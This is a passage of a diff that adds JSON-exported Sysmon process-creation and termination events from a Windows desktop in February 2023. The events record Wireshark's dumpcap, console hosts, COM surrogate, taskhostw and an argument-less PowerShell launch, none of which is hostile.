+   "CurrentDirectory": "C:\\Windows",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=57B0CCD3AEBC6C7126E7C19F5DAC492DF51D904A505C5F5B0CB02270D53F8684",
+   "ParentProcessGuid": "10DA3E43-D8C7-63F8-9100-000000000900",
+   "ParentProcessId": 5572,
+   "ParentImage": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -i \\Device\\NPF_{18BA4954-86CF-484A-ABA2-DBBA09EE4EE6} -L --list-time-stamp-types -Z none",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.07192
+   },
+   "EventRecordID": 21,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:28.055",
+   "ProcessGuid": "10DA3E43-D8C7-63F8-9100-000000000900",
+   "ProcessId": 5572,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.0848224
+   },
+   "EventRecordID": 22,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:28.076",
+   "ProcessGuid": "10DA3E43-D8C8-63F8-9300-000000000900",
+   "ProcessId": 5608,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "FileVersion": "4.0.3",
+   "Description": "Dumpcap",
+   "Product": "Dumpcap",
+   "Company": "The Wireshark developer community",
+   "OriginalFileName": "Dumpcap.exe",
+   "CommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -i \\Device\\NPF_Loopback -L --list-time-stamp-types -Z none",
+   "CurrentDirectory": "C:\\Program Files\\Wireshark\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=8DC9CB75BE241F559878CE18DB3CF2E52D0CB3A312509F11F741B1A4F7498C5D",
+   "ParentProcessGuid": "10DA3E43-D8C3-63F8-8C00-000000000900",
+   "ParentProcessId": 5356,
+   "ParentImage": "C:\\Program Files\\Wireshark\\Wireshark.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\Wireshark.exe\" ",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.0848608
+   },
+   "EventRecordID": 23,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:28.072",
+   "ProcessGuid": "10DA3E43-D8C7-63F8-9200-000000000900",
+   "ProcessId": 5580,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.090576
+   },
+   "EventRecordID": 24,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:28.086",
+   "ProcessGuid": "10DA3E43-D8C8-63F8-9400-000000000900",
+   "ProcessId": 5616,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Console Window Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "CONHOST.EXE",
+   "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+   "CurrentDirectory": "C:\\Windows",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=57B0CCD3AEBC6C7126E7C19F5DAC492DF51D904A505C5F5B0CB02270D53F8684",
+   "ParentProcessGuid": "10DA3E43-D8C8-63F8-9300-000000000900",
+   "ParentProcessId": 5608,
+   "ParentImage": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -i \\Device\\NPF_Loopback -L --list-time-stamp-types -Z none",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.1744063
+   },
+   "EventRecordID": 25,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:28.165",
+   "ProcessGuid": "10DA3E43-D8C8-63F8-9300-000000000900",
+   "ProcessId": 5608,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.1870368
+   },
+   "EventRecordID": 26,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:28.178",
+   "ProcessGuid": "10DA3E43-D8C8-63F8-9400-000000000900",
+   "ProcessId": 5616,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.2136352
+   },
+   "EventRecordID": 27,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:28.208",
+   "ProcessGuid": "10DA3E43-D8C8-63F8-9500-000000000900",
+   "ProcessId": 5644,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "FileVersion": "4.0.3",
+   "Description": "Dumpcap",
+   "Product": "Dumpcap",
+   "Company": "The Wireshark developer community",
+   "OriginalFileName": "Dumpcap.exe",
+   "CommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -S -Z 5356.dummy",
+   "CurrentDirectory": "C:\\Program Files\\Wireshark\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=8DC9CB75BE241F559878CE18DB3CF2E52D0CB3A312509F11F741B1A4F7498C5D",
+   "ParentProcessGuid": "10DA3E43-D8C3-63F8-8C00-000000000900",
+   "ParentProcessId": 5356,
+   "ParentImage": "C:\\Program Files\\Wireshark\\Wireshark.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\Wireshark.exe\" ",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.2195263
+   },
+   "EventRecordID": 28,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:28.215",
+   "ProcessGuid": "10DA3E43-D8C8-63F8-9600-000000000900",
+   "ProcessId": 5652,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Console Window Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "CONHOST.EXE",
+   "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+   "CurrentDirectory": "C:\\Windows",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=57B0CCD3AEBC6C7126E7C19F5DAC492DF51D904A505C5F5B0CB02270D53F8684",
+   "ParentProcessGuid": "10DA3E43-D8C8-63F8-9500-000000000900",
+   "ParentProcessId": 5644,
+   "ParentImage": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -S -Z 5356.dummy",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252811.3319168
+   },
+   "EventRecordID": 29,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:31.316",
+   "ProcessGuid": "10DA3E43-D8A9-63F8-7700-000000000900",
+   "ProcessId": 4924,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252814.0917647
+   },
+   "EventRecordID": 30,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:34.082",
+   "ProcessGuid": "10DA3E43-D8C8-63F8-9500-000000000900",
+   "ProcessId": 5644,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252814.0949616
+   },
+   "EventRecordID": 31,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:34.082",
+   "ProcessGuid": "10DA3E43-D8C8-63F8-9600-000000000900",
+   "ProcessId": 5652,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252814.1159887
+   },
+   "EventRecordID": 32,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:34.102",
+   "ProcessGuid": "10DA3E43-D8CE-63F8-9700-000000000900",
+   "ProcessId": 5732,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "FileVersion": "4.0.3",
+   "Description": "Dumpcap",
+   "Product": "Dumpcap",
+   "Company": "The Wireshark developer community",
+   "OriginalFileName": "Dumpcap.exe",
+   "CommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -n -i \\Device\\NPF_{18BA4954-86CF-484A-ABA2-DBBA09EE4EE6} -y EN10MB -Z 5356",
+   "CurrentDirectory": "C:\\Program Files\\Wireshark\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=8DC9CB75BE241F559878CE18DB3CF2E52D0CB3A312509F11F741B1A4F7498C5D",
+   "ParentProcessGuid": "10DA3E43-D8C3-63F8-8C00-000000000900",
+   "ParentProcessId": 5356,
+   "ParentImage": "C:\\Program Files\\Wireshark\\Wireshark.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\Wireshark.exe\" ",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252814.1288447
+   },
+   "EventRecordID": 33,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:34.117",
+   "ProcessGuid": "10DA3E43-D8CE-63F8-9800-000000000900",
+   "ProcessId": 5740,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Console Window Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "CONHOST.EXE",
+   "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+   "CurrentDirectory": "C:\\Windows",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=57B0CCD3AEBC6C7126E7C19F5DAC492DF51D904A505C5F5B0CB02270D53F8684",
+   "ParentProcessGuid": "10DA3E43-D8CE-63F8-9700-000000000900",
+   "ParentProcessId": 5732,
+   "ParentImage": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -n -i \\Device\\NPF_{18BA4954-86CF-484A-ABA2-DBBA09EE4EE6} -y EN10MB -Z 5356",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252816.852368
+   },
+   "EventRecordID": 34,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:36.820",
+   "ProcessGuid": "10DA3E43-D8D0-63F8-9900-000000000900",
+   "ProcessId": 5812,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "COM Surrogate",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "dllhost.exe",
+   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252818.3552833
+   },
+   "EventRecordID": 35,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:38.298",
+   "ProcessGuid": "10DA3E43-D8D2-63F8-9A00-000000000900",
+   "ProcessId": 5864,
+   "Image": "C:\\Windows\\System32\\taskhostw.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Host Process for Windows Tasks",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "taskhostw.exe",
+   "CommandLine": "taskhostw.exe $(Arg0)",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-126D-030000000000",
+   "LogonId": 224530,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "High",
+   "Hashes": "SHA256=72279AD47EED7FBF2472214824696351B9CB2571B8EE5D8C92FADA23B378D812",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 1008,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252818.4223168
+   },
+   "EventRecordID": 36,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:38.415",
+   "ProcessGuid": "10DA3E43-D8D2-63F8-9A00-000000000900",
+   "ProcessId": 5864,
+   "Image": "C:\\Windows\\System32\\taskhostw.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252818.8548608
+   },
+   "EventRecordID": 37,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:38.788",
+   "ProcessGuid": "10DA3E43-D8D2-63F8-9B00-000000000900",
+   "ProcessId": 5888,
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Windows PowerShell",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "PowerShell.EXE",
+   "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+   "CurrentDirectory": "C:\\Users\\wade\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F",
+   "ParentProcessGuid": "10DA3E43-D893-63F8-5600-000000000900",
+   "ParentProcessId": 2688,
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252818.9445455
+   },
+   "EventRecordID": 38,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:38.856",
+   "ProcessGuid": "10DA3E43-D8D2-63F8-9C00-000000000900",
+   "ProcessId": 5896,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Console Window Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "CONHOST.EXE",
+   "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+   "CurrentDirectory": "C:\\Windows",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=57B0CCD3AEBC6C7126E7C19F5DAC492DF51D904A505C5F5B0CB02270D53F8684",
+   "ParentProcessGuid": "10DA3E43-D8D2-63F8-9B00-000000000900",
+   "ParentProcessId": 5888,
+   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252820.4352975
+   },
+   "EventRecordID": 39,
+   "Correlation": {},
+   "Execution": {
